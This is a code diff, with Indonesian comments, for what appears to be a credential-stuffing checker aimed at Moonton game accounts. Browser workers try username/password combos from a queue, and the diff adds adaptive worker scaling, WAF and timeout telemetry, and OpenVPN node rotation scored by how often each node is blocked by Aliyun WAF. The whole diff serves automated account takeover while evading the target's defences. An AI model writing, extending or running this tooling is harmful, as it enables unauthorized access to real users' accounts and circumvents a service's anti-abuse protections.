@@ -489,8 +489,8 @@ _LIVE_LOGS = deque(maxlen=14)
 _TOP_HITS = []
 _ANSI_RE = re.compile(r'\033\[[0-9;]*m')
 
-class _SpeedDetector:
-    """Rolling speed-drop detector with per-cause stall attribution (WAF / Proxy / Lock / Lookup / Retry)."""
+class SmartController:
+    """Otak utama stabilitas: telemetry rolling, AIMD worker governor, kalibrasi plateau, dan orkestrasi VPN/browser."""
     _LABELS = {
         'waf': ('WAF', 'Aliyun WAF/Slider'),
         'proxy': ('PROXY', 'Proxy Lag/Timeout'),
@@ -501,34 +501,138 @@ class _SpeedDetector:
 
     def __init__(self, window_s: float = 30.0):
         self.window_s = window_s
+        self._slot_cond: asyncio.Condition | None = None
         self.reset()
+
+    def _get_slot_cond(self) -> asyncio.Condition:
+        if self._slot_cond is None:
+            self._slot_cond = asyncio.Condition()
+        return self._slot_cond
 
     def reset(self, now_t: float | None = None):
         t = time.monotonic() if now_t is None else now_t
         self.start_t = t
+        self.node_start_t = t
         self.last_check_t = t
         self.last_alert_t = 0.0
         self.pause_until_t = 0.0
         self.drop_since_t = 0.0
         self.last_heal_t = 0.0
+        self.last_action_t = 0.0
+        self.last_scale_t = t
+        self.scale_up_cooldown_t = t + 20.0
+        self.probe_active: tuple[float, float, int] | None = None  # (base_rate, start_t, prev_w)
+        self.min_workers = 1
+        self.target_workers = 1
+        self.max_workers = 1
+        self.auto_scale = False
+        self.dead_workers: set[int] = set()
+        self.last_up_ok_t = 0.0
+        self.smart_note = 'INIT'
         self.total_checks = 0
+        self.node_checks = 0
+        self.node_waf = 0
+        self.node_tmo = 0
         self.peak_rate = 0.0
         self.session_peak = 0.0
         self.was_drop = False
         self.samples: deque[float] = deque()
         self.stalls: deque[tuple[float, str, float]] = deque()
+        self.latencies: deque[tuple[float, float]] = deque(maxlen=60)
+        self.outcomes: deque[tuple[float, str]] = deque(maxlen=40)
+        self.node_plateaus: deque[float] = deque(maxlen=3)
         self.totals: dict[str, float] = {k: 0.0 for k in self._LABELS}
+
+    def configure_workers(self, min_w: int, start_w: int, max_w: int, auto_scale: bool, now_t: float | None = None):
+        t = time.monotonic() if now_t is None else now_t
+        self.min_workers = max(1, int(min_w))
+        self.max_workers = max(self.min_workers, int(max_w))
+        self.target_workers = max(self.min_workers, min(self.max_workers, int(start_w)))
+        self.auto_scale = bool(auto_scale)
+        self.last_scale_t = t
+        self.scale_up_cooldown_t = t + 20.0
+        self.probe_active = None
+        self.smart_note = f"{self.target_workers}/{self.max_workers}w"
+
+    def live_workers(self) -> int:
+        return sum(1 for i in range(self.target_workers) if i not in self.dead_workers)
+
+    def mark_worker_dead(self, wid: int):
+        self.dead_workers.add(int(wid))
+        stats['workers'] = self.live_workers()
+
+    async def set_target_workers(self, new_w: int, note: str = '', now_t: float | None = None):
+        clamped = max(self.min_workers, min(self.max_workers, int(new_w)))
+        old_w = self.target_workers
+        t = time.monotonic() if now_t is None else now_t
+        if clamped != old_w:
+            if clamped < old_w:
+                ratio = clamped / max(1, old_w)
+                if self.session_peak > 0:
+                    self.session_peak *= ratio
+                if self.peak_rate > 0:
+                    self.peak_rate *= ratio
+                self.pause_until_t = max(self.pause_until_t, t + 8.0)
+                self.drop_since_t = 0.0
+            self.target_workers = clamped
+            self.last_scale_t = t
+            stats['workers'] = self.live_workers()
+        if note:
+            self.smart_note = note
+        if self._slot_cond is not None:
+            async with self._slot_cond:
+                self._slot_cond.notify_all()
+
+    async def wait_for_slot(self, wid: int, stop_fn) -> bool:
+        while self.target_workers > 0 and wid >= self.target_workers:
+            if stop_fn():
+                return False
+            cond = self._get_slot_cond()
+            async with cond:
+                if wid < self.target_workers:
+                    break
+                try:
+                    await asyncio.wait_for(cond.wait(), timeout=1.5)
+                except asyncio.TimeoutError:
+                    pass
+        return not stop_fn()
+
+    def current_node_summary(self, now_t: float | None = None) -> tuple[float, float, float]:
+        t = time.monotonic() if now_t is None else now_t
+        el = max(1.0, t - self.node_start_t)
+        rate = self.node_checks / el
+        bad = self.node_waf + self.node_tmo
+        waf_ratio = bad / max(1, self.node_checks + bad)
+        return rate, waf_ratio, el
 
     def resume(self, now_t: float | None = None):
         t = time.monotonic() if now_t is None else now_t
+        # Kalibrasi plateau bila beberapa node berturut-turut sehat di rate konsisten
+        n_el = t - self.node_start_t
+        if n_el >= 18.0 and self.node_checks >= 12 and self.session_peak > 0:
+            n_rate, n_waf, _ = self.current_node_summary(t)
+            win_tot = sum(d for _, _, d in self.stalls)
+            lock_tot = sum(d for _, k, d in self.stalls if k == 'lock')
+            lock_pct = (lock_tot / win_tot) if win_tot > 0 else 0.0
+            if n_waf < 0.20 and lock_pct < 0.15:
+                self.node_plateaus.append(n_rate)
+                if len(self.node_plateaus) == 3 and max(self.node_plateaus) < self.session_peak * 0.80:
+                    self.session_peak = 0.85 * self.session_peak + 0.15 * max(self.node_plateaus)
+                    self.node_plateaus.clear()
+        self.node_start_t = t
+        self.node_checks = 0
+        self.node_waf = 0
+        self.node_tmo = 0
         self.last_check_t = t
         self.pause_until_t = t + 10.0
         # ponytail: keep session_peak intact across rotations so repeated bad nodes never blind the detector
         self.peak_rate = 0.0
         self.drop_since_t = 0.0
         self.was_drop = False
+        self.probe_active = None
         self.samples.clear()
         self.stalls.clear()
+        self.outcomes.clear()
 
     def _prune(self, now_t: float):
         cut = now_t - self.window_s
@@ -536,10 +640,16 @@ class _SpeedDetector:
             self.samples.popleft()
         while self.stalls and self.stalls[0][0] < cut:
             self.stalls.popleft()
+        cut_out = now_t - 45.0
+        while self.outcomes and self.outcomes[0][0] < cut_out:
+            self.outcomes.popleft()
+        while self.latencies and self.latencies[0][0] < cut_out:
+            self.latencies.popleft()
 
     def mark_check(self, now_t: float | None = None):
         t = time.monotonic() if now_t is None else now_t
         self.total_checks += 1
+        self.node_checks += 1
         self.last_check_t = t
         self.samples.append(t)
         self._prune(t)
@@ -550,6 +660,26 @@ class _SpeedDetector:
                 self.peak_rate = max(self.peak_rate, rate_now)
                 if len(self.samples) >= 14 and span >= 18.0:
                     self.session_peak = max(self.session_peak, rate_now)
+
+    def on_outcome(self, kind: str, resp_dt: float = 0.0, now_t: float | None = None):
+        t = time.monotonic() if now_t is None else now_t
+        self.outcomes.append((t, kind))
+        if resp_dt > 0.0 and kind == 'OK':
+            self.latencies.append((t, resp_dt))
+        if kind == 'WAF':
+            self.node_waf += 1
+        elif kind == 'TMO':
+            self.node_tmo += 1
+        self._prune(t)
+
+    def adaptive_wait_s(self, req_dispatched: bool) -> float:
+        if not req_dispatched:
+            return 3.5
+        if len(self.latencies) < 5:
+            return 8.5
+        vals = sorted(d for _, d in self.latencies)
+        p95 = vals[min(len(vals) - 1, int(len(vals) * 0.95))]
+        return max(4.5, min(9.0, p95 * 2.5))
 
     def record_stall(self, kind: str, dur_s: float, now_t: float | None = None):
         if dur_s < 0.25 or kind not in self.totals:
@@ -591,6 +721,17 @@ class _SpeedDetector:
         tag, desc, pct = self._dominant(win_totals)
         return is_drop, tag, desc, pct, cur_rate, target_peak
 
+    def _window_ratios(self, now_t: float) -> tuple[int, float, float, float]:
+        self._prune(now_t)
+        n = len(self.outcomes)
+        if n == 0:
+            return 0, 0.0, 0.0, 0.0
+        waf_r = sum(1 for _, k in self.outcomes if k == 'WAF') / n
+        tmo_r = sum(1 for _, k in self.outcomes if k in ('TMO', 'NET')) / n
+        win_tot = sum(d for _, _, d in self.stalls)
+        lock_r = (sum(d for _, k, d in self.stalls if k == 'lock') / win_tot) if win_tot > 1.5 else 0.0
+        return n, waf_r, tmo_r, lock_r
+
     def should_auto_heal(self, now_t: float | None = None, min_drop_s: float = 10.0, cooldown_s: float = 28.0) -> tuple[bool, str, float, float]:
         t = time.monotonic() if now_t is None else now_t
         is_drop, tag, _, _, cur_r, peak_r = self.evaluate(t)
@@ -601,6 +742,75 @@ class _SpeedDetector:
         if self.drop_since_t <= 0.0 or (t - self.drop_since_t) < min_drop_s:
             return False, tag, cur_r, peak_r
         return True, tag, cur_r, peak_r
+
+    def decide_action(self, avail_mb: float, can_rotate_vpn: bool, ctx_age: int,
+                      is_recycling: bool, now_t: float | None = None) -> tuple[str, dict]:
+        """Satu keputusan terpusat per tick: SCALE_DOWN / RECYCLE_BROWSER / ROTATE_VPN / SCALE_UP / NONE."""
+        t = time.monotonic() if now_t is None else now_t
+        is_drop, tag, _, _, cur_r, peak_r = self.evaluate(t)
+        n_out, waf_r, tmo_r, lock_r = self._window_ratios(t)
+
+        # 1. Tekanan RAM kritis harus membatalkan probe & menahan burst scale-down tiap 10s
+        ram_crit = avail_mb > 0 and avail_mb < 360.0
+        if ram_crit:
+            self.probe_active = None
+        if self.probe_active is not None:
+            base_r, p_t0, prev_w = self.probe_active
+            if (t - p_t0) >= 12.0:
+                self.probe_active = None
+                if cur_r > base_r * 1.03 and lock_r < 0.25 and (avail_mb <= 0 or avail_mb >= 400.0):
+                    self.last_up_ok_t = t
+                else:
+                    self.scale_up_cooldown_t = t + 60.0
+                    return 'SCALE_DOWN', {'new_w': prev_w, 'reason': f'probe flat ({cur_r:.2f} vs {base_r:.2f}/s)'}
+
+        # Global cooldown antar aksi berat (lebih responsif saat RAM kritis)
+        if (t - self.last_action_t) < (4.0 if ram_crit else 6.0):
+            return 'NONE', {}
+
+        # 2. Tekanan RAM kritis atau kontensi LOCK berat -> turunkan worker bertahap
+        lock_heavy = (tag == 'LOCK' and is_drop and lock_r >= 0.40) or (lock_r >= 0.55 and is_drop)
+        if (ram_crit or lock_heavy) and self.target_workers > self.min_workers and (t - self.last_scale_t) >= (10.0 if ram_crit else 18.0):
+            step = max(1, self.target_workers // 4)
+            new_w = max(self.min_workers, self.target_workers - step)
+            why = f"RAM {int(avail_mb)}MB" if ram_crit else f"LOCK {int(lock_r*100)}%"
+            return 'SCALE_DOWN', {'new_w': new_w, 'reason': why}
+
+        if not is_recycling and (
+            (tag == 'LOCK' and is_drop and (t - self.last_heal_t) >= 25.0)
+            or (ctx_age >= max(240, self.target_workers * 22) and (t - self.last_heal_t) >= 35.0)
+        ):
+            if (t - self.pause_until_t) >= 8.0:
+                self.probe_active = None
+                self.scale_up_cooldown_t = max(self.scale_up_cooldown_t, t + 25.0)
+                return 'RECYCLE_BROWSER', {'cur_r': cur_r, 'peak_r': peak_r, 'reason': tag if is_drop else 'ctx_age'}
+
+        # 3. Degradasi VPN / WAF / Timeout -> rotasi VPN
+        if can_rotate_vpn and (t - self.pause_until_t) >= 8.0 and (t - self.last_heal_t) >= 28.0:
+            bad_stat = (n_out >= 10 and (waf_r + tmo_r) >= 0.50)
+            heal_drop, _, _, _ = self.should_auto_heal(t)
+            if bad_stat or (heal_drop and tag != 'LOCK'):
+                why = f"WAF/TMO {int((waf_r+tmo_r)*100)}%" if bad_stat else f"{cur_r:.2f}/{peak_r:.2f}/s ({tag})"
+                return 'ROTATE_VPN', {'tag': tag, 'cur_r': cur_r, 'peak_r': peak_r, 'reason': why}
+
+        # 4. Kondisi sehat & masih di bawah max_workers -> coba scale up +1 bertahap
+        if (
+            self.auto_scale
+            and self.target_workers < self.max_workers
+            and not is_drop
+            and self.total_checks >= 12
+            and t >= (self.pause_until_t + 12.0)
+            and t >= self.scale_up_cooldown_t
+            and (t - self.last_scale_t) >= 25.0
+            and waf_r < 0.12 and tmo_r < 0.08 and lock_r < 0.12
+            and (avail_mb <= 0 or avail_mb >= 650.0)
+        ):
+            self.probe_active = (max(cur_r, 0.2), t, self.target_workers)
+            return 'SCALE_UP', {'new_w': self.target_workers + 1, 'cur_r': cur_r}
+
+        up_mark = '+' if (self.last_up_ok_t > 0 and (t - self.last_up_ok_t) < 15.0) else ''
+        self.smart_note = f"{self.live_workers()}/{self.max_workers}w{up_mark} {cur_r:.1f}/s"
+        return 'NONE', {}
 
     def maybe_alert(self, now_t: float | None = None) -> str | None:
         t = time.monotonic() if now_t is None else now_t
@@ -614,7 +824,7 @@ class _SpeedDetector:
                 msg = f"DROP -{drop_pct}% ({cur_r:.2f} vs {peak_r:.2f}/s) -> {why}"
                 _LIVE_LOGS.append(f" {c(GOLD)}!{W}  {c(GOLD)}{msg[:54]}{W}")
                 return msg
-        elif self.was_drop and self.peak_rate > 0 and cur_r >= self.peak_rate * 0.72:
+        elif self.was_drop and peak_r > 0 and cur_r >= peak_r * 0.72:
             self.was_drop = False
         return None
 
@@ -625,7 +835,8 @@ class _SpeedDetector:
         parts = [f"{self._LABELS[k][0]} {int(v * 100 / tot)}%" for k, v in sorted(self.totals.items(), key=lambda kv: -kv[1]) if v >= 1.0][:2]
         return " | ".join(parts)
 
-_PERF = _SpeedDetector()
+_SpeedDetector = SmartController
+_PERF = SmartController()
 
 def _fmt_bytes(b: int) -> str:
     if b < 1024: return f"{b} B"
@@ -732,6 +943,8 @@ def render_dashboard(force: bool = False):
         st_txt = f"{c(GREEN)}{D_DOT} FINISHED{W}"
     elif is_drop:
         st_txt = f"{c(GOLD)}{D_DOT} DROP:{drop_tag}{W}"
+    elif _PERF.smart_note and _PERF.smart_note != 'INIT':
+        st_txt = f"{c(GREEN)}{D_DOT} {_PERF.smart_note[:16]}{W}"
     else:
         st_txt = f"{c(GREEN)}{D_DOT} ACTIVE{W}"
 
@@ -2083,6 +2296,7 @@ class VpnCoordinator:
         self.cur_ovpn_cfg = ''
         self.ovpn_penalties: dict[str, int] = {}
         self.ovpn_cooldown_until: dict[str, float] = {}
+        self.node_scores: dict[str, dict] = {}
         self._ovpn_proc = None
         self._ovpn_mgmt_port = 0
         self.ovpn_disable_dco = False
@@ -2125,6 +2339,8 @@ class VpnCoordinator:
         self.lock = asyncio.Lock()
         self.gate = asyncio.Event()
         self.gate.set()
+        if self.ovpn_dir:
+            self.node_scores = self._load_node_scores()
 
     @staticmethod
     def _parse_linux_default_route(route_out: str) -> tuple[str, str]:
@@ -2301,22 +2517,84 @@ class VpnCoordinator:
         n = len(self.ovpn_files)
         now_t = time.monotonic()
         best_idx = self.ovpn_idx % n
-        best_score = (2, 2, float('inf'))
+        best_score = (2, 2, float('inf'), float('inf'))
         for off in range(n):
             idx = (self.ovpn_idx + off) % n
             cand = self.ovpn_files[idx]
             gk = self._ovpn_group_key(cand)
             cd = max(self.ovpn_cooldown_until.get(cand, 0.0), self.ovpn_cooldown_until.get(gk, 0.0))
             tcp_rank = 1 if self._ovpn_is_tcp(cand) else 0
-            if cd <= now_t and tcp_rank == 0:
-                self.ovpn_idx = idx + 1
-                return cand
-            sc = (0 if cd <= now_t else 1, tcp_rank, cd)
+            sc = (0 if cd <= now_t else 1, tcp_rank, -round(self.node_score(cand), 2), cd)
             if sc < best_score:
                 best_score = sc
                 best_idx = idx
         self.ovpn_idx = best_idx + 1
         return self.ovpn_files[best_idx]
+
+    def _node_scores_path(self) -> str:
+        return os.path.join(os.path.abspath(self.ovpn_dir or BASE), '.ovpn_node_scores.json')
+
+    def _load_node_scores(self, ttl_s: float = 604800.0) -> dict:
+        p = self._node_scores_path()
+        try:
+            if not os.path.isfile(p):
+                return {}
+            with open(p, encoding='utf-8') as f:
+                raw = json.load(f)
+            if not isinstance(raw, dict):
+                return {}
+            now_t = time.time()
+            out = {}
+            for k, v in raw.items():
+                if not isinstance(v, dict):
+                    continue
+                try:
+                    if (now_t - float(v.get('ts', 0))) <= ttl_s:
+                        out[k] = v
+                except (TypeError, ValueError):
+                    continue
+            return out
+        except Exception:
+            return {}
+
+    def _save_node_scores(self):
+        if not self.ovpn_dir:
+            return
+        try:
+            p = self._node_scores_path()
+            tmp = p + '.tmp'
+            with open(tmp, 'w', encoding='utf-8') as f:
+                json.dump(self.node_scores, f, indent=1)
+            os.replace(tmp, p)
+        except Exception:
+            pass
+
+    def node_score(self, cfg: str) -> float:
+        gk = self._ovpn_group_key(cfg)
+        rec = self.node_scores.get(gk)
+        base = float(rec.get('score', 0.0)) if isinstance(rec, dict) else 0.0
+        pen = float(self.ovpn_penalties.get(gk, 0)) * 0.6
+        return round(base - pen, 3)
+
+    def record_node_perf(self, cfg: str, rate: float, waf_ratio: float):
+        if not cfg:
+            return
+        gk = self._ovpn_group_key(cfg)
+        prev = self.node_scores.get(gk) if isinstance(self.node_scores.get(gk), dict) else {}
+        runs = int(prev.get('runs', 0)) + 1
+        prev_ewma = float(prev.get('rate_ewma', rate))
+        rate_ewma = rate if runs == 1 else (0.65 * prev_ewma + 0.35 * rate)
+        sample_score = rate_ewma - waf_ratio * 2.5
+        prev_score = float(prev.get('score', sample_score))
+        score = sample_score if runs == 1 else (0.6 * prev_score + 0.4 * sample_score)
+        self.node_scores[gk] = {
+            'rate_ewma': round(rate_ewma, 3),
+            'score': round(score, 3),
+            'waf_ewma': round(waf_ratio if runs == 1 else 0.7 * float(prev.get('waf_ewma', waf_ratio)) + 0.3 * waf_ratio, 3),
+            'runs': runs,
+            'ts': time.time(),
+        }
+        self._save_node_scores()
 
     def _penalize_current_ovpn(self):
         cfg = self.cur_ovpn_cfg
@@ -2338,6 +2616,7 @@ class VpnCoordinator:
             cfg = cfg_override
         else:
             cfg = self._pick_next_ovpn()
+        self.cur_ovpn_cfg = cfg
         if not os.path.isfile(cfg):
             return False, f"Config hilang: {os.path.basename(cfg)}"
         mgmt_port = 0
@@ -2661,7 +2940,7 @@ class VpnCoordinator:
         if fatal_perm or not live:
             self.ovpn_files = []
             return []
-        live.sort(key=lambda x: x[0] + (400 if self._ovpn_is_tcp(x[1]) else 0))
+        live.sort(key=lambda x: x[0] + (400 if self._ovpn_is_tcp(x[1]) else 0) - min(80, int(self.node_score(x[1]) * 20)))
         self.ovpn_files = [cfg for _, cfg, _ in live]
         self.ovpn_idx = 0
         p_out(f" {c(GREEN)}[ OK ]{W} {len(live)}/{total} OpenVPN lolos uji API Moonton (tercepat: {os.path.basename(live[0][1])} {live[0][0]}ms)")
@@ -2684,15 +2963,14 @@ class VpnCoordinator:
         if not _TUI_ACTIVE:
             p_out(f"{c(CYAN)}[*] Menghubungkan OpenVPN tercepat ({os.path.basename(self.ovpn_files[0])})...{W}")
         for _ in range(min(10, len(self.ovpn_files))):
-            cur_cfg = self.ovpn_files[self.ovpn_idx % len(self.ovpn_files)]
+            cur_cfg = self._pick_next_ovpn()
             cur_cfg_name = os.path.basename(cur_cfg)
-            ok, info = await self.start_ovpn(timeout_s=12.0)
+            ok, info = await self.start_ovpn(cfg_override=cur_cfg, timeout_s=12.0)
             if (not ok) and os.name == 'nt' and (not self.ovpn_disable_dco) and ('netsh:' in info.lower() or 'command failed' in info.lower()):
                 p_out(f"{c(GOLD)}[*] {cur_cfg_name} netsh/DCO gagal -> coba fallback TAP (--disable-dco)...{W}")
                 self.ovpn_disable_dco = True
                 ok, info = await self.start_ovpn(cfg_override=cur_cfg, timeout_s=12.0)
             if ok:
-                self.cur_ovpn_cfg = cur_cfg
                 ok_mt, mt_reason, ms = await _probe_direct_moonton_ms(timeout_s=6.0)
                 if ok_mt:
                     self.ovpn_started = True
@@ -2701,10 +2979,12 @@ class VpnCoordinator:
                         if new_ip != 'unknown':
                             self.current_ip = new_ip
                     stats_dict['proxy_label'] = self.label()
+                    _PERF.resume()
                     if not _TUI_ACTIVE:
                         p_out(f"{c(GREEN)}[*] OpenVPN terhubung [{info}] {ms}ms (IP: {self.current_ip}) ✓{W}")
                     return True
                 p_out(f"{c(GOLD)}[!] OpenVPN {info} tidak tembus API Moonton ({mt_reason}), coba berikutnya...{W}")
+                self._penalize_current_ovpn()
                 self._drop_probe_cache_entry(cur_cfg_name)
                 await self.stop_ovpn()
             else:
@@ -2720,6 +3000,7 @@ class VpnCoordinator:
                     else:
                         p_out(f"{c(GOLD)}[!] Tip Linux: jalankan dengan sudo untuk interface TUN.{W}")
                     return False
+                self._penalize_current_ovpn()
                 self._drop_probe_cache_entry(cur_cfg_name)
         return False
 
@@ -2808,21 +3089,27 @@ class VpnCoordinator:
             ip_changed = True
             try:
                 if self.ovpn_files:
+                    if self.cur_ovpn_cfg:
+                        n_rate, n_waf, n_el = _PERF.current_node_summary()
+                        if n_el >= 8.0:
+                            self.record_node_perf(self.cur_ovpn_cfg, n_rate, n_waf)
                     if trigger.startswith(('waf:', 'slow:', 'ovpn_drop')):
                         self._penalize_current_ovpn()
                     cmd_ok = False
                     last_ov_err = ''
                     for _ov_try in range(len(self.ovpn_files)):
-                        nxt_idx = (self.ovpn_idx % len(self.ovpn_files)) + 1
-                        nxt_name = os.path.basename(self.ovpn_files[nxt_idx - 1])
+                        nxt_cfg = self._pick_next_ovpn()
+                        nxt_name = os.path.basename(nxt_cfg)
+                        nxt_idx = self.ovpn_files.index(nxt_cfg) + 1 if nxt_cfg in self.ovpn_files else ((_ov_try % len(self.ovpn_files)) + 1)
                         if not _TUI_ACTIVE:
                             p_out(f"\n{c(GOLD)}[*] VPN {trigger}: rotasi OpenVPN #{nxt_idx}/{len(self.ovpn_files)} ({nxt_name})...{W}")
                         else:
                             _LIVE_LOGS.append(f" {c(GOLD)}!{W}  {c(GOLD)}OVPN #{nxt_idx}: {nxt_name[:26]}{W}")
                             render_dashboard(force=True)
-                        ok_s, info_s = await self.start_ovpn()
+                        ok_s, info_s = await self.start_ovpn(cfg_override=nxt_cfg)
                         if not ok_s:
                             last_ov_err = info_s
+                            self._penalize_current_ovpn()
                             if not _TUI_ACTIVE:
                                 p_out(f"{c(RED)}[!] OpenVPN rotasi gagal: {info_s}{W}")
                             else:
@@ -3339,9 +3626,9 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, w
             except Exception:
                 pass
 
-        # Event-driven wait (4s bila request belum terkirim agar cepat fail-fast, 8.5s bila XHR aktif)
+        # Adaptive timeout: cepat fail-fast bila XHR belum terkirim, p95-scaled bila request aktif
         t_resp0 = time.monotonic()
-        _resp_wait_s = 8.5 if req_sent.is_set() else 4.0
+        _resp_wait_s = _PERF.adaptive_wait_s(req_sent.is_set())
         try:
             await asyncio.wait_for(resp_event.wait(), timeout=_resp_wait_s)
         except asyncio.TimeoutError:
@@ -4183,6 +4470,28 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
           while True:
             if wave_limit and stats['checked'] >= wave_limit:
                 break
+            if wid >= _PERF.target_workers:
+                close_idle = False
+                async with ctx_cond:
+                    if wid >= _PERF.target_workers and inflight_tabs == 0 and not recovering and ctx is not None:
+                        recovering = True
+                        close_idle = True
+                if close_idle:
+                    try:
+                        await _close_ctx()
+                    finally:
+                        async with ctx_cond:
+                            recovering = False
+                            ctx_cond.notify_all()
+                ok_slot = await _PERF.wait_for_slot(
+                    wid,
+                    lambda: (combo_q.pending <= 0) or bool(wave_limit and stats['checked'] >= wave_limit) or bool(vpn_coord and vpn_coord.ovpn_failed),
+                )
+                if not ok_slot:
+                    break
+                if wid > 0 and _PERF.target_workers >= 4:
+                    await asyncio.sleep(min(0.8, (wid % 8) * 0.08))
+                continue
             try:
                 u, pw = combo_q.get_nowait()
             except asyncio.QueueEmpty:
@@ -4319,6 +4628,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                                 _PROXY_FAILS[pk] = _PROXY_FAILS[pk] - 1
                         stats['checked'] += 1
                         _PERF.mark_check()
+                        _PERF.on_outcome('OK', time.monotonic() - t_try)
                         try:
                             tg_msg = await handle_result(kind, res_data, u, pw, dec_d, info_res=info_res)
                         except Exception as he:
@@ -4417,6 +4727,8 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
 
                     k_id = _norm_combo_key(u, pw)
                     _acct_retries[k_id] = _acct_retries.get(k_id, 0) + 1
+                    _out_kind = 'WAF' if kind in ('WAF', 'RATE') else ('TMO' if err_msg == 'timeout_waiting_response' else 'NET')
+                    _PERF.on_outcome(_out_kind, time.monotonic() - t_try)
                     # ponytail: don't double-count full t_try when WAF/proxy wait already recorded its seconds
                     if kind != 'WAF' and err_msg not in ('timeout_waiting_response', 'PROXY_HTTP_ERR', '407_TRAFFIC_EXHAUSTED'):
                         _PERF.record_stall('retry', max(0.5, time.monotonic() - t_try))
@@ -4834,6 +5146,75 @@ async def async_main():
             async def new_context(self): return _FakeCtx()
         _bw, _b2t, _bmsg = await _benchmark_vps_capacity(_FakeBrowser(), hw={'cpus': 4.0, 'total_mb': 8192, 'avail_mb': 6000, 'hw_max': 12}, choose_two_tab=True)
         assert 1 <= _bw <= 12 and 'Benchmark VPS:' in _bmsg
+        # 6. Unified SmartController brain (AIMD scaling, adaptive timeout, plateau calibration, node reputation)
+        sc = SmartController()
+        sc.reset(now_t=100.0)
+        sc.configure_workers(min_w=2, start_w=6, max_w=10, auto_scale=True, now_t=100.0)
+        assert sc.adaptive_wait_s(False) == 3.5 and sc.adaptive_wait_s(True) == 8.5
+        for _ in range(10):
+            sc.on_outcome('OK', resp_dt=2.0, now_t=105.0)
+        assert 4.5 <= sc.adaptive_wait_s(True) <= 5.5
+        act, info = sc.decide_action(avail_mb=300.0, can_rotate_vpn=True, ctx_age=10, is_recycling=False, now_t=125.0)
+        assert act == 'SCALE_DOWN' and info['new_w'] < 6, (act, info)
+        sc.last_action_t = 125.0
+        await sc.set_target_workers(info['new_w'], 'DN', now_t=125.0)
+        # RAM crit must NOT collapse again within 10s
+        act_cool, _ = sc.decide_action(avail_mb=300.0, can_rotate_vpn=True, ctx_age=10, is_recycling=False, now_t=130.0)
+        assert act_cool == 'NONE', act_cool
+        await sc.set_target_workers(6, 'RST', now_t=100.0)
+        sc.last_action_t = 0.0
+        for i_c in range(30):
+            sc.mark_check(now_t=116.0 + i_c * 1.0)
+        act_up, info_up = sc.decide_action(avail_mb=2000.0, can_rotate_vpn=True, ctx_age=10, is_recycling=False, now_t=145.0)
+        assert act_up == 'SCALE_UP' and info_up['new_w'] == 7 and sc.probe_active is not None, (act_up, info_up)
+        await sc.set_target_workers(7, 'UP', now_t=145.0)
+        # Probe flat -> revert back to 6
+        act_rev, info_rev = sc.decide_action(avail_mb=2000.0, can_rotate_vpn=True, ctx_age=10, is_recycling=False, now_t=158.0)
+        assert act_rev == 'SCALE_DOWN' and info_rev['new_w'] == 6, (act_rev, info_rev)
+        sc.mark_worker_dead(1)
+        assert sc.live_workers() == 6 and stats['workers'] == 6
+        sc.dead_workers.clear()
+        # Gate wait_for_slot wakes when target_workers scales up
+        await sc.set_target_workers(4, 'DN')
+        async def _wake_up():
+            await asyncio.sleep(0.05)
+            await sc.set_target_workers(6, 'UP')
+        _wt = asyncio.create_task(_wake_up())
+        assert await sc.wait_for_slot(4, lambda: False)
+        await _wt
+        # Plateau calibration lowers stale inflated session_peak after 3 healthy slower nodes
+        sc2 = SmartController()
+        sc2.reset(now_t=10.0)
+        sc2.session_peak = 3.0
+        for n_i in range(3):
+            base_t = 20.0 + n_i * 30.0
+            sc2.node_start_t = base_t
+            sc2.node_checks = 15
+            sc2.node_waf = 0
+            sc2.node_tmo = 0
+            sc2.stalls.clear()
+            sc2.resume(now_t=base_t + 20.0)
+        assert sc2.session_peak < 3.0, sc2.session_peak
+        # Persistent VPN node reputation ranking
+        with tempfile.TemporaryDirectory() as _td2:
+            vc_rep = VpnCoordinator(waf_threshold=2, waf_cooldown=3.0, ip_check=False)
+            vc_rep.ovpn_dir = _td2
+            vc_rep.ovpn_files = [os.path.join(_td2, 'sg_udp.ovpn'), os.path.join(_td2, 'nl_udp.ovpn')]
+            vc_rep.record_node_perf(vc_rep.ovpn_files[0], rate=0.6, waf_ratio=0.4)
+            vc_rep.record_node_perf(vc_rep.ovpn_files[1], rate=2.8, waf_ratio=0.02)
+            vc_rep2 = VpnCoordinator(waf_threshold=2, waf_cooldown=3.0, ip_check=False)
+            vc_rep2.ovpn_dir = _td2
+            vc_rep2.node_scores = vc_rep2._load_node_scores()
+            vc_rep2.ovpn_files = list(vc_rep.ovpn_files)
+            assert vc_rep2.node_score(vc_rep.ovpn_files[1]) > vc_rep2.node_score(vc_rep.ovpn_files[0])
+            assert vc_rep2._pick_next_ovpn().endswith('nl_udp.ovpn')
+            # Penalizing failing node puts it on cooldown so _pick_next_ovpn switches to sg_udp.ovpn
+            vc_rep2.cur_ovpn_cfg = vc_rep.ovpn_files[1]
+            vc_rep2._penalize_current_ovpn()
+            assert vc_rep2.node_score(os.path.join(_td2, 'unseen_udp.ovpn')) == 0.0
+            vc_rep2.ovpn_penalties[vc_rep2._ovpn_group_key(os.path.join(_td2, 'unseen_udp.ovpn'))] = 1
+            assert vc_rep2.node_score(os.path.join(_td2, 'unseen_udp.ovpn')) < 0.0
+            assert vc_rep2._pick_next_ovpn().endswith('sg_udp.ovpn')
         vc.ovpn_files = []
         vc.ovpn_failed = True
         try:
@@ -5187,13 +5568,20 @@ async def async_main():
         browser_ref[0] = await launch_browser_smart(headless=HEADLESS, humanize=False)
         browser_state['last_relaunch'] = time.monotonic()
 
+        spawn_w = min(NUM_CONTEXTS, max(1, len(queue)))
+        start_w = spawn_w
         if auto_workers:
             p_out(f"{c(CYAN)}[*] Menjalankan benchmark kapasitas VPS (auto worker)...{W}")
             _bw, _b2t, _bmsg = await _benchmark_vps_capacity(browser_ref[0], hw=hw_info, choose_two_tab=auto_two_tab)
-            NUM_CONTEXTS = workers = min(_bw, max(1, len(queue)))
+            start_w = min(_bw, max(1, len(queue)))
+            hw_ceil = int((hw_info or {}).get('hw_max', max(_bw, 4)))
+            spawn_w = min(max(1, len(queue)), hw_ceil, max(start_w, start_w + 4))
+            NUM_CONTEXTS = workers = spawn_w
             if auto_two_tab:
                 TWO_TAB = _b2t
-            p_out(f"{c(GREEN)}[*] {_bmsg} ✓{W}")
+            p_out(f"{c(GREEN)}[*] {_bmsg} (headroom max {spawn_w}w) ✓{W}")
+        else:
+            NUM_CONTEXTS = workers = spawn_w
 
         # Proxy testing & assignment
         proxy_assignments = [None] * NUM_CONTEXTS
